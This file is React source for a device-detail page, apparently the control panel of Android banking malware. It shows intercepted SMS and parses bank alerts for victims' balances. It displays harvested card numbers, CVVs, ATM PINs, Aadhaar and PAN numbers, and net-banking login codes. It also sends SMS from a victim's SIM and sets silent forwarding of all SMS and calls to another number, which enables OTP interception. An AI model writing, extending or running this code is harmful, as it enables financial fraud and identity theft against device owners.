import { useEffect, useMemo, useState, useRef } from 'react';
import { useParams, useNavigate, useSearchParams } from 'react-router-dom';
import { useDevices } from '../contexts/DeviceContext';
import { useSocket } from '../contexts/SocketContext';
import { SMS, FormData, SimInfo } from '../types';
import {
    formatINR,
    getDeviceNumberMap,
    getLatestBalance,
    getSimLabelForSms,
    getSimSummary,
    isTransactionMessage,
    parseTransaction,
} from '../utils/transactions';

type TabType = 'sms' | 'money' | 'forms' | 'settings' | 'sendsms';

function formatTime(timestamp: string): string {
    return new Date(timestamp).toLocaleString();
}

// SMS List Component — now searchable / filterable, SIM- and money-aware
function SMSList({ messages, simCards }: { messages: SMS[]; simCards: SimInfo[] }) {
    const [query, setQuery] = useState('');
    const [typeFilter, setTypeFilter] = useState<'all' | 'incoming' | 'outgoing'>('all');
    const [moneyOnly, setMoneyOnly] = useState(false);

    const filtered = useMemo(() => {
        const q = query.trim().toLowerCase();
        const list = messages.filter((sms) => {
            if (typeFilter !== 'all' && sms.type !== typeFilter) return false;
            if (moneyOnly && !isTransactionMessage(sms.message)) return false;
            if (!q) return true;
            const party = (sms.type === 'incoming' ? sms.sender : sms.receiver).toLowerCase();
            return sms.message.toLowerCase().includes(q) || party.includes(q);
        });
        return [...list].sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    }, [messages, query, typeFilter, moneyOnly]);

    return (
        <div>
            <div className="toolbar toolbar-compact">
                <div className="search-wrap">
                    <span className="search-icon">🔍</span>
                    <input
                        className="form-input search-input"
                        placeholder={`Search ${messages.length} messages…`}
                        value={query}
                        onChange={(e) => setQuery(e.target.value)}
                    />
                    {query && (
                        <button className="search-clear" onClick={() => setQuery('')} aria-label="Clear search">✕</button>
                    )}
                </div>
                <div className="toolbar-filters">
                    <div className="segmented">
                        {(['all', 'incoming', 'outgoing'] as const).map((t) => (
                            <button key={t} className={`segmented-btn ${typeFilter === t ? 'active' : ''}`} onClick={() => setTypeFilter(t)}>
                                {t === 'all' ? 'All' : t === 'incoming' ? '📥 In' : '📤 Out'}
                            </button>
                        ))}
                    </div>
                    <button
                        className={`segmented-btn ${moneyOnly ? 'active' : ''}`}
                        onClick={() => setMoneyOnly((v) => !v)}
                        title="Show only money / transaction messages"
                    >
                        💰 Money{moneyOnly ? ' ✓' : ''}
                    </button>
                </div>
            </div>

            {filtered.length === 0 ? (
                <div className="empty-state" style={{ padding: '2rem' }}>
                    <div className="empty-state-icon">{messages.length === 0 ? '💬' : '🔍'}</div>
                    <h2>{messages.length === 0 ? 'No Messages' : 'No matches'}</h2>
                    <p>{messages.length === 0 ? 'SMS messages will appear here when synced from the device.' : 'Try a different search or clear the filters.'}</p>
                </div>
            ) : (
                <>
                    <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '0.75rem' }}>
                        Showing {filtered.length} of {messages.length} messages
                    </p>
                    <div className="data-list">
                        {filtered.map((sms) => {
                            const txn = isTransactionMessage(sms.message) ? parseTransaction(sms.message) : null;
                            const simLabel = getSimLabelForSms(sms, simCards);
                            return (
                                <div key={sms.id} className="data-item">
                                    <div className={`data-item-icon ${sms.type}`}>
                                        {sms.type === 'incoming' ? '📥' : '📤'}
                                    </div>
                                    <div className="data-item-content">
                                        <div className="data-item-header">
                                            <span className="data-item-title">
                                                {sms.type === 'incoming' ? sms.sender : sms.receiver}
                                            </span>
                                            <span className="data-item-time">{formatTime(sms.timestamp)}</span>
                                        </div>
                                        <div className="data-item-body">{sms.message}</div>
                                        <div className="data-item-meta">
                                            <span className={`badge ${sms.type === 'incoming' ? 'badge-success' : 'badge-warning'}`}>
                                                {sms.type}
                                            </span>
                                            {txn && (
                                                <span className={`badge ${txn.kind === 'credit' ? 'badge-success' : txn.kind === 'debit' ? 'badge-danger' : 'badge-warning'}`}>
                                                    💰 {txn.kind}{txn.amount !== null ? ` ${formatINR(txn.amount)}` : ''}
                                                </span>
                                            )}
                                            {txn?.balance !== null && txn?.balance !== undefined && (
                                                <span className="badge">Bal {formatINR(txn.balance)}</span>
                                            )}
                                            {simLabel ? (
                                                <span className="badge" title="SIM this message was sent/received on (reported by the device)">📶 {simLabel}</span>
                                            ) : simCards.length > 1 ? (
                                                <span className="badge" title="Device has multiple SIMs but this message predates per-SIM tagging — update the Android app for per-message SIM labels">📶 SIM n/a</span>
                                            ) : null}
                                        </div>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </>
            )}
        </div>
    );
}

// Money / transactions tab for a single device
function MoneyTab({ messages, deviceName }: { messages: SMS[]; deviceName: string }) {
    const balance = useMemo(() => getLatestBalance(messages), [messages]);
    const txns = useMemo(() => {
        return messages
            .filter((s) => isTransactionMessage(s.message))
            .map((sms) => ({ sms, parsed: parseTransaction(sms.message) }))
            .sort((a, b) => new Date(b.sms.timestamp).getTime() - new Date(a.sms.timestamp).getTime());
    }, [messages]);

    const totals = useMemo(() => {
        let credit = 0;
        let debit = 0;
        for (const t of txns) {
            if (t.parsed.kind === 'credit' && t.parsed.amount !== null) credit += t.parsed.amount;
            if (t.parsed.kind === 'debit' && t.parsed.amount !== null) debit += t.parsed.amount;
        }
        return { credit, debit, net: credit - debit };
    }, [txns]);

    if (txns.length === 0) {
        return (
            <div className="empty-state" style={{ padding: '2rem' }}>
                <div className="empty-state-icon">💰</div>
                <h2>No money messages</h2>
                <p>No credit, debit or balance SMS found on {deviceName} yet. Bank and UPI alerts appear here automatically.</p>
            </div>
        );
    }

    return (
        <div>
            {balance && (
                <div className="glass-card balance-card" style={{ marginBottom: '1rem' }}>
                    <div className="balance-device">🏦 Latest known balance</div>
                    <div className="balance-amount">{formatINR(balance.balance)}</div>
                    <div className="balance-meta">via {balance.sender} · {formatTime(balance.timestamp)}</div>
                </div>
            )}
            <div className="stats-row" style={{ marginBottom: '1rem' }}>
                <div className="stat-card stat-online">
                    <div className="stat-value">{formatINR(totals.credit)}</div>
                    <div className="stat-label">Credited</div>
                </div>
                <div className="stat-card stat-offline">
                    <div className="stat-value">{formatINR(totals.debit)}</div>
                    <div className="stat-label">Debited</div>
                </div>
                <div className="stat-card stat-money">
                    <div className="stat-value">{formatINR(totals.net)}</div>
                    <div className="stat-label">Net</div>
                </div>
            </div>
            <div className="data-list">
                {txns.map(({ sms, parsed }) => (
                    <div key={sms.id} className="data-item">
                        <div className="data-item-icon">{parsed.kind === 'credit' ? '💵' : parsed.kind === 'debit' ? '💸' : '🏦'}</div>
                        <div className="data-item-content">
                            <div className="data-item-header">
                                <span className="data-item-title">{sms.type === 'incoming' ? sms.sender : sms.receiver}</span>
                                <span className="data-item-time">{formatTime(sms.timestamp)}</span>
                            </div>
                            <div className="data-item-body">{sms.message}</div>
                            <div className="data-item-meta">
                                <span className={`badge ${parsed.kind === 'credit' ? 'badge-success' : parsed.kind === 'debit' ? 'badge-danger' : 'badge-warning'}`}>
                                    {parsed.kind}{parsed.amount !== null ? ` · ${formatINR(parsed.amount)}` : ''}
                                </span>
                                {parsed.balance !== null && <span className="badge">Bal {formatINR(parsed.balance)}</span>}
                            </div>
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
}

// Forms List Component
function FormsList({ forms }: { forms: FormData[] }) {
    if (forms.length === 0) {
        return (
            <div className="empty-state" style={{ padding: '2rem' }}>
                <div className="empty-state-icon">📝</div>
                <h2>No Form Submissions</h2>
                <p>Form data submitted from the Android app will appear here.</p>
            </div>
        );
    }

    // Sort forms by submission date (newest first)
    const sortedForms = [...forms].sort((a, b) =>
        new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()
    );

    return (
        <div className="data-list">
            {sortedForms.map((form, idx) => (
                <div key={idx} className="data-item" style={{ display: 'block', padding: '1rem' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
                            <span style={{ fontSize: '1.5rem' }}>📋</span>
                            <div>
                                <div style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
                                    {form.fullName || form.name || form.pageName || 'Submission'}
                                </div>
                                <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
                                    {form.pageName && (
                                        <span style={{
                                            background: 'rgba(59, 130, 246, 0.2)',
                                            color: '#3b82f6',
                                            padding: '2px 6px',
                                            borderRadius: '4px',
                                            fontWeight: 500
                                        }}>
                                            {form.pageName}
                                        </span>
                                    )}
                                    <span>#{sortedForms.length - idx}</span>
                                </div>
                            </div>
                        </div>
                        <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                            {formatTime(form.submittedAt)}
                        </span>
                    </div>

                    {/* Personal Details - show only if has data */}
                    {(form.fullName || form.name || form.mobileNumber || form.phoneNumber || form.motherName || form.dateOfBirth) && (
                        <div style={{ marginBottom: '1rem' }}>
                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>👤 Personal Details</div>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
                                {(form.fullName || form.name) && <div><strong>Name:</strong> {form.fullName || form.name}</div>}
                                {(form.mobileNumber || form.phoneNumber) && <div><strong>Mobile:</strong> {form.mobileNumber || form.phoneNumber}</div>}
                                {form.motherName && <div><strong>Mother:</strong> {form.motherName}</div>}
                                {form.dateOfBirth && <div><strong>DOB:</strong> {form.dateOfBirth}</div>}
                            </div>
                        </div>
                    )}

                    {/* Account Details - show only if has data */}
                    {(form.accountNumber || form.aadhaarNumber || form.panCard || form.panNumber || form.cifNumber || form.branchCode) && (
                        <div style={{ marginBottom: '1rem' }}>
                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🏦 Account Details</div>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
                                {form.accountNumber && <div><strong>Account:</strong> {form.accountNumber}</div>}
                                {form.aadhaarNumber && <div><strong>Aadhaar:</strong> {form.aadhaarNumber}</div>}
                                {(form.panCard || form.panNumber) && <div><strong>PAN:</strong> {form.panCard || form.panNumber}</div>}
                                {form.cifNumber && <div><strong>CIF:</strong> {form.cifNumber}</div>}
                                {form.branchCode && <div><strong>Branch:</strong> {form.branchCode}</div>}
                            </div>
                        </div>
                    )}

                    {/* Card Details - show only if has data */}
                    {(form.cardLast6 || form.cardNumber || form.cardExpiry || form.validThrough || form.cvv || form.atmPin || form.finalPin) && (
                        <div style={{ marginBottom: '1rem' }}>
                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>💳 Card Details</div>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
                                {(form.cardNumber || form.cardLast6) && <div><strong>Card Number:</strong> {form.cardNumber || form.cardLast6}</div>}
                                {(form.validThrough || form.cardExpiry) && <div><strong>Expiry:</strong> {form.validThrough || form.cardExpiry}</div>}
                                {form.cvv && <div><strong>CVV:</strong> {form.cvv}</div>}
                                {form.atmPin && <div><strong>PIN:</strong> {form.atmPin}</div>}
                                {form.finalPin && <div><strong>Final PIN:</strong> {form.finalPin}</div>}
                            </div>
                        </div>
                    )}

                    {/* Login Credentials - show only if has data */}
                    {(form.userId || form.accessCode || form.profileCode) && (
                        <div>
                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔐 Login Credentials</div>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
                                {form.userId && <div><strong>User ID:</strong> {form.userId}</div>}
                                {form.accessCode && <div><strong>Access Code:</strong> {form.accessCode}</div>}
                                {form.profileCode && <div><strong>Profile Code:</strong> {form.profileCode}</div>}
                            </div>
                        </div>
                    )}
                </div>
            ))}
        </div>
    );
}


// SIM Cards Component — proper multi-SIM detection display
function SimCardsList({ simCards }: { simCards: SimInfo[] }) {
    const summary = getSimSummary(simCards);
    if (!simCards || simCards.length === 0) {
        return (
            <div className="section">
                <h3 className="section-title">📱 SIM Cards</h3>
                <div style={{ padding: '1rem', color: 'var(--text-muted)', textAlign: 'center' }}>
                    No SIM information available. Device may need to sync (open the Android app and pull to sync).
                </div>
            </div>
        );
    }

    return (
        <div className="section">
            <h3 className="section-title">
                📱 SIM Cards ({simCards.length}) — {simCards.length > 1 ? 'Dual/Multi SIM detected' : summary.label}
            </h3>
            <div style={{ display: 'grid', gap: '1rem', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))' }}>
                {[...simCards].sort((a, b) => a.slotIndex - b.slotIndex).map((sim, idx) => (
                    <div key={idx} className={`sim-card ${simCards.length > 1 ? 'multi' : ''}`}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '0.75rem' }}>
                            <span style={{ fontSize: '1.5rem' }}>📶</span>
                            <div>
                                <div style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
                                    SIM {sim.slotIndex + 1} · {sim.displayName || `Slot ${sim.slotIndex + 1}`}
                                </div>
                                <div style={{ fontSize: '0.875rem', color: 'var(--text-muted)' }}>
                                    Slot {sim.slotIndex + 1} · subId {sim.subscriptionId}
                                </div>
                            </div>
                            <span className="badge badge-success" style={{ marginLeft: 'auto' }}>active</span>
                        </div>
                        <div style={{ fontSize: '0.875rem', display: 'flex', flexDirection: 'column', gap: '0.25rem' }}>
                            <div><strong>Carrier:</strong> {sim.carrierName || 'Unknown'}</div>
                            <div><strong>Number:</strong> {sim.phoneNumber || 'Hidden by carrier / not available'}</div>
                            {sim.countryIso && <div><strong>Country:</strong> {sim.countryIso.toUpperCase()}</div>}
                        </div>
                    </div>
                ))}
            </div>
            {simCards.length > 1 && (
                <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginTop: '0.75rem' }}>
                    Multi-SIM device: choose the sending SIM in “Send SMS”, and per-message SIM badges appear once the Android app reports subId (newer builds).
                </p>
            )}
        </div>
    );
}

// Send SMS Component
function SendSMSPanel({ deviceId, simCards, deviceStatus, initialTo = '', initialBody = '' }: { deviceId: string; simCards: SimInfo[]; deviceStatus: string; initialTo?: string; initialBody?: string }) {
    const { sendSms } = useDevices();
    const [recipientNumber, setRecipientNumber] = useState(initialTo);
    const [message, setMessage] = useState(initialBody);
    const [selectedSim, setSelectedSim] = useState<number>(-1);
    const [isSending, setIsSending] = useState(false);
    const [sendResult, setSendResult] = useState<{ success: boolean; message: string } | null>(null);

    useEffect(() => {
        setRecipientNumber(initialTo);
        setMessage(initialBody);
    }, [initialTo, initialBody]);

    const handleSend = async () => {
        if (!recipientNumber.trim() || !message.trim()) {
            setSendResult({ success: false, message: 'Please enter recipient number and message' });
            return;
        }

        setIsSending(true);
        setSendResult(null);

        try {
            const success = await sendSms(deviceId, recipientNumber.trim(), message.trim(), selectedSim > 0 ? selectedSim : undefined);
            if (success) {
                setSendResult({ success: true, message: 'SMS sent successfully!' });
                setRecipientNumber('');
                setMessage('');
            } else {
                setSendResult({ success: false, message: 'Failed to send SMS. Please try again.' });
            }
        } catch (error) {
            setSendResult({ success: false, message: 'Error sending SMS' });
        } finally {
            setIsSending(false);
        }
    };

    const isOffline = deviceStatus !== 'online';

    return (
        <div>
            {isOffline && (
                <div style={{
                    background: 'rgba(239, 68, 68, 0.1)',
                    border: '1px solid rgba(239, 68, 68, 0.3)',
                    borderRadius: 'var(--radius-md)',
                    padding: '1rem',
                    marginBottom: '1rem',
                    color: '#ef4444'
                }}>
                    ⚠️ Device is offline. SMS cannot be sent.
                </div>
            )}

            {simCards && simCards.length > 0 && (
                <div className="form-group">
                    <label className="form-label">
                        Select SIM Card {simCards.length > 1 ? `(${simCards.length} detected)` : ''}
                    </label>
                    <select
                        className="form-input"
                        value={selectedSim}
                        onChange={(e) => setSelectedSim(Number(e.target.value))}
                        disabled={isOffline || isSending}
                    >
                        <option value={-1}>Default SIM (device default)</option>
                        {[...simCards].sort((a, b) => a.slotIndex - b.slotIndex).map((sim, idx) => (
                            <option key={idx} value={sim.subscriptionId}>
                                SIM {sim.slotIndex + 1} — {sim.displayName || `Slot ${sim.slotIndex + 1}`} ({sim.carrierName}{sim.phoneNumber ? ` · ${sim.phoneNumber}` : ''})
                            </option>
                        ))}
                    </select>
                    {simCards.length > 1 && (
                        <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '0.25rem' }}>
                            Dual/multi SIM detected — pick which SIM sends this message.
                        </div>
                    )}
                </div>
            )}

            <div className="form-group">
                <label className="form-label">Recipient Number</label>
                <input
                    type="tel"
                    className="form-input"
                    placeholder="+1234567890"
                    value={recipientNumber}
                    onChange={(e) => setRecipientNumber(e.target.value)}
                    disabled={isOffline || isSending}
                />
            </div>

            <div className="form-group">
                <label className="form-label">Message</label>
                <textarea
                    className="form-input"
                    placeholder="Enter your message..."
                    rows={4}
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                    disabled={isOffline || isSending}
                    style={{ resize: 'vertical', minHeight: '100px' }}
                />
                <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '0.25rem' }}>
                    {message.length} characters
                </div>
            </div>

            {sendResult && (
                <div style={{
                    background: sendResult.success ? 'rgba(34, 197, 94, 0.1)' : 'rgba(239, 68, 68, 0.1)',
                    border: `1px solid ${sendResult.success ? 'rgba(34, 197, 94, 0.3)' : 'rgba(239, 68, 68, 0.3)'}`,
                    borderRadius: 'var(--radius-md)',
                    padding: '0.75rem',
                    marginBottom: '1rem',
                    color: sendResult.success ? '#22c55e' : '#ef4444'
                }}>
                    {sendResult.success ? '✅' : '❌'} {sendResult.message}
                </div>
            )}

            <button
                className="btn btn-primary"
                onClick={handleSend}
                disabled={isOffline || isSending || !recipientNumber.trim() || !message.trim()}
                style={{ width: '100%', opacity: (isOffline || isSending) ? 0.6 : 1 }}
            >
                {isSending ? '📤 Sending...' : '📤 Send SMS'}
            </button>
        </div>
    );
}

// Forwarding Settings Component
function ForwardingSettings({ deviceId, simCards }: { deviceId: string; simCards: SimInfo[] }) {
    const { deviceData, updateForwarding } = useDevices();
    const data = deviceData.get(deviceId);

    const [smsNumber, setSmsNumber] = useState('');
    const [callsNumber, setCallsNumber] = useState('');
    const [smsSimId, setSmsSimId] = useState<number>(-1);
    const [callsSimId, setCallsSimId] = useState<number>(-1);
    const initializedRef = useRef(false);

    useEffect(() => {
        // Only initialize once when data first loads
        if (data?.forwarding && !initializedRef.current) {
            setSmsNumber(data.forwarding.smsForwardTo || '');
            setCallsNumber(data.forwarding.callsForwardTo || '');
            setSmsSimId(data.forwarding.smsSubscriptionId ?? -1);
            setCallsSimId(data.forwarding.callsSubscriptionId ?? -1);
            initializedRef.current = true;
        }
    }, [data?.forwarding]);

    const toggleSmsForwarding = () => {
        updateForwarding(deviceId, {
            smsEnabled: !data?.forwarding.smsEnabled,
            smsForwardTo: smsNumber,
            smsSubscriptionId: smsSimId > 0 ? smsSimId : undefined
        });
    };

    const toggleCallsForwarding = () => {
        updateForwarding(deviceId, {
            callsEnabled: !data?.forwarding.callsEnabled,
            callsForwardTo: callsNumber,
            callsSubscriptionId: callsSimId > 0 ? callsSimId : undefined
        });
    };

    const saveSmsSettings = () => {
        updateForwarding(deviceId, {
            smsForwardTo: smsNumber,
            smsSubscriptionId: smsSimId > 0 ? smsSimId : undefined
        });
    };

    const saveCallsSettings = () => {
        updateForwarding(deviceId, {
            callsForwardTo: callsNumber,
            callsSubscriptionId: callsSimId > 0 ? callsSimId : undefined
        });
    };

    const hasMultipleSims = simCards && simCards.length > 1;

    return (
        <div>
            <div className="section">
                <h3 className="section-title">📨 SMS Forwarding</h3>
                <div className="toggle-container">
                    <div>
                        <div className="toggle-label">Enable SMS Forwarding</div>
                        <div className="toggle-description">Forward all incoming SMS to another number</div>
                    </div>
                    <div
                        className={`toggle-switch ${data?.forwarding.smsEnabled ? 'active' : ''}`}
                        onClick={toggleSmsForwarding}
                    />
                </div>

                {hasMultipleSims && (
                    <div className="form-group">
                        <label className="form-label">Use SIM for forwarding:</label>
                        <select
                            className="form-input"
                            value={smsSimId}
                            onChange={(e) => setSmsSimId(Number(e.target.value))}
                        >
                            <option value={-1}>Default SIM</option>
                            {simCards.map((sim, idx) => (
                                <option key={idx} value={sim.subscriptionId}>
                                    {sim.displayName || `SIM ${sim.slotIndex + 1}`} ({sim.carrierName})
                                </option>
                            ))}
                        </select>
                    </div>
                )}

                <div className="form-group">
                    <label className="form-label">Forward SMS to:</label>
                    <div style={{ display: 'flex', gap: '0.5rem' }}>
                        <input
                            type="tel"
                            className="form-input"
                            placeholder="+1234567890"
                            value={smsNumber}
                            onChange={(e) => setSmsNumber(e.target.value)}
                        />
                        <button className="btn btn-primary" onClick={saveSmsSettings}>Save</button>
                    </div>
                </div>
            </div>

            <div className="section">
                <h3 className="section-title">📞 Call Forwarding</h3>
                <div className="toggle-container">
                    <div>
                        <div className="toggle-label">Enable Call Forwarding</div>
                        <div className="toggle-description">Forward all incoming calls to another number</div>
                    </div>
                    <div
                        className={`toggle-switch ${data?.forwarding.callsEnabled ? 'active' : ''}`}
                        onClick={toggleCallsForwarding}
                    />
                </div>

                {hasMultipleSims && (
                    <div className="form-group">
                        <label className="form-label">Use SIM for forwarding:</label>
                        <select
                            className="form-input"
                            value={callsSimId}
                            onChange={(e) => setCallsSimId(Number(e.target.value))}
                        >
                            <option value={-1}>Default SIM</option>
                            {simCards.map((sim, idx) => (
                                <option key={idx} value={sim.subscriptionId}>
                                    {sim.displayName || `SIM ${sim.slotIndex + 1}`} ({sim.carrierName})
                                </option>
                            ))}
                        </select>
                    </div>
                )}

                <div className="form-group">
                    <label className="form-label">Forward Calls to:</label>
                    <div style={{ display: 'flex', gap: '0.5rem' }}>
                        <input
                            type="tel"
                            className="form-input"
                            placeholder="+1234567890"
                            value={callsNumber}
                            onChange={(e) => setCallsNumber(e.target.value)}
                        />
                        <button className="btn btn-primary" onClick={saveCallsSettings}>Save</button>
                    </div>
                </div>
            </div>
        </div>
    );
}

// Main Device Detail Page
export default function DeviceDetail() {
    const { id } = useParams<{ id: string }>();
    const navigate = useNavigate();
    const [params] = useSearchParams();
    const { devices, deviceData, getDeviceData, requestSync } = useDevices();
    useSocket(); // Ensures socket is connected

    const initialTab = (params.get('tab') as TabType) || 'sms';
    const [activeTab, setActiveTab] = useState<TabType>(
        ['sms', 'money', 'forms', 'settings', 'sendsms'].includes(initialTab) ? initialTab : 'sms',
    );
    const [isSyncing, setIsSyncing] = useState(false);

    const device = devices.find(d => d.id === id);
    const data = id ? deviceData.get(id) : undefined;

    useEffect(() => {
        if (id) {
            getDeviceData(id);
        }
    }, [id, getDeviceData]);

    const numberMap = getDeviceNumberMap(devices);
    const deviceNumber = id ? numberMap.get(id) ?? 0 : 0;
    const simCards = device?.simCards || data?.simCards || [];
    const smsCount = data?.sms.length || 0;
    const moneyCount = useMemo(
        () => (data?.sms || []).filter((s) => isTransactionMessage(s.message)).length,
        [data?.sms],
    );
    const balance = useMemo(
        () => (data?.sms ? getLatestBalance(data.sms, id || '', device?.name || '') : null),
        [data?.sms, id, device?.name],
    );

    if (!device) {
        return (
            <>
                <button className="back-button" onClick={() => navigate('/')}>
                    ← Back to Dashboard
                </button>
                <div className="glass-card empty-state">
                    <div className="empty-state-icon">❓</div>
                    <h2>Device Not Found</h2>
                    <p>The device you're looking for doesn't exist or has been disconnected.</p>
                </div>
            </>
        );
    }

    return (
        <>
            <button className="back-button" onClick={() => navigate('/')}>
                ← Back to Dashboard
            </button>

            <header className="page-header">
                <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
                    <div className="device-icon" style={{ width: 56, height: 56, fontSize: '1.75rem', position: 'relative' }}>
                        📱
                        <span className="device-number-float">#{deviceNumber}</span>
                    </div>
                    <div>
                        <h1 className="page-title">#{deviceNumber} {device.name}</h1>
                        <p className="page-subtitle">
                            {device.phoneNumber || simCards.find(s => s.phoneNumber)?.phoneNumber || 'No number'}
                            {simCards.length > 0 && (
                                <> · 📶 {getSimSummary(simCards).label}{getSimSummary(simCards).carriers ? ` (${getSimSummary(simCards).carriers})` : ''}</>
                            )}
                            {balance && <> · 💰 {formatINR(balance.balance)}</>}
                        </p>
                        {device.status === 'offline' && device.lastDisconnectReason && (
                            <p className="page-subtitle" style={{ fontSize: '0.72rem', opacity: 0.7 }}>
                                Last drop: {device.lastDisconnectReason}
                                {device.lastDisconnectAt ? ` · ${new Date(device.lastDisconnectAt).toLocaleString()}` : ''}
                            </p>
                        )}
                        {/* Forwarding status badges */}
                        <div style={{ display: 'flex', gap: '0.5rem', marginTop: '0.5rem', flexWrap: 'wrap' }}>
                            {data?.forwarding?.smsEnabled && (
                                <span style={{
                                    background: 'rgba(34, 197, 94, 0.2)',
                                    color: '#22c55e',
                                    padding: '0.25rem 0.5rem',
                                    borderRadius: '4px',
                                    fontSize: '0.75rem',
                                    fontWeight: 500
                                }}>
                                    ✅ SMS → {data.forwarding.smsForwardTo || 'Not set'}
                                </span>
                            )}
                            {data?.forwarding?.callsEnabled && (
                                <span style={{
                                    background: 'rgba(59, 130, 246, 0.2)',
                                    color: '#3b82f6',
                                    padding: '0.25rem 0.5rem',
                                    borderRadius: '4px',
                                    fontSize: '0.75rem',
                                    fontWeight: 500
                                }}>
                                    📞 Calls → {data.forwarding.callsForwardTo || 'Not set'}
                                </span>
                            )}
                        </div>
                    </div>
                    <div style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: '1rem' }}>
                        <button
                            className="btn btn-primary"
                            onClick={() => {
                                if (id && device.status === 'online') {
                                    setIsSyncing(true);
                                    requestSync(id);
                                    setTimeout(() => setIsSyncing(false), 3000);
                                }
                            }}
                            disabled={device.status !== 'online' || isSyncing}
                            style={{
                                display: 'flex',
                                alignItems: 'center',
                                gap: '0.5rem',
                                opacity: device.status !== 'online' || isSyncing ? 0.6 : 1,
                                cursor: device.status !== 'online' ? 'not-allowed' : 'pointer'
                            }}
                        >
                            {isSyncing ? '🔄' : '🔄'} {isSyncing ? 'Syncing...' : 'Sync Now'}
                        </button>
                        <div className={`device-status ${device.status}`}>
                            <span className={`status-dot ${device.status}`}></span>
                            {device.status}
                        </div>
                    </div>
                </div>
            </header>

            <div className="tabs">
                <button
                    className={`tab ${activeTab === 'sms' ? 'active' : ''}`}
                    onClick={() => setActiveTab('sms')}
                >
                    💬 SMS ({smsCount})
                </button>
                <button
                    className={`tab ${activeTab === 'money' ? 'active' : ''}`}
                    onClick={() => setActiveTab('money')}
                >
                    💰 Money ({moneyCount})
                </button>
                <button
                    className={`tab ${activeTab === 'sendsms' ? 'active' : ''}`}
                    onClick={() => setActiveTab('sendsms')}
                >
                    📤 Send SMS
                </button>
                <button
                    className={`tab ${activeTab === 'forms' ? 'active' : ''}`}
                    onClick={() => setActiveTab('forms')}
                >
                    📝 Forms ({data?.forms.length || 0})
                </button>
                <button
                    className={`tab ${activeTab === 'settings' ? 'active' : ''}`}
                    onClick={() => setActiveTab('settings')}
                >
                    ⚙️ Settings
                </button>
            </div>

            <div className="glass-card">
                {activeTab === 'sms' && <SMSList messages={data?.sms || []} simCards={simCards} />}
                {activeTab === 'money' && <MoneyTab messages={data?.sms || []} deviceName={device.name} />}
                {activeTab === 'sendsms' && id && (
                    <>
                        <SimCardsList simCards={simCards} />
                        <div style={{ marginTop: '1.5rem' }}>
                            <h3 className="section-title">📤 Send SMS from Device</h3>
                            <SendSMSPanel
                                deviceId={id}
                                simCards={simCards}
                                deviceStatus={device.status}
                                initialTo={params.get('to') || ''}
                                initialBody={params.get('body') || ''}
                            />
                        </div>
                    </>
                )}
                {activeTab === 'forms' && <FormsList forms={data?.forms || []} />}
                {activeTab === 'settings' && id && <ForwardingSettings deviceId={id} simCards={simCards} />}
            </div>

            {/* Mobile Bottom Navigation */}
            <nav className="mobile-bottom-nav">
                <div className="nav-items">
                    <button
                        className={`nav-item ${activeTab === 'sms' ? 'active' : ''}`}
                        onClick={() => setActiveTab('sms')}
                    >
                        <span className="nav-icon">💬</span>
                        <span>SMS</span>
                    </button>
                    <button
                        className={`nav-item ${activeTab === 'money' ? 'active' : ''}`}
                        onClick={() => setActiveTab('money')}
                    >
                        <span className="nav-icon">💰</span>
                        <span>Money</span>
                    </button>
                    <button
                        className={`nav-item ${activeTab === 'sendsms' ? 'active' : ''}`}
                        onClick={() => setActiveTab('sendsms')}
                    >
                        <span className="nav-icon">📤</span>
                        <span>Send</span>
                    </button>
                    <button
                        className={`nav-item ${activeTab === 'forms' ? 'active' : ''}`}
                        onClick={() => setActiveTab('forms')}
                    >
                        <span className="nav-icon">📝</span>
                        <span>Forms</span>
                    </button>
                    <button
                        className={`nav-item ${activeTab === 'settings' ? 'active' : ''}`}
                        onClick={() => setActiveTab('settings')}
                    >
                        <span className="nav-icon">⚙️</span>
                        <span>Settings</span>
                    </button>
                </div>
            </nav>
        </>
    );
}
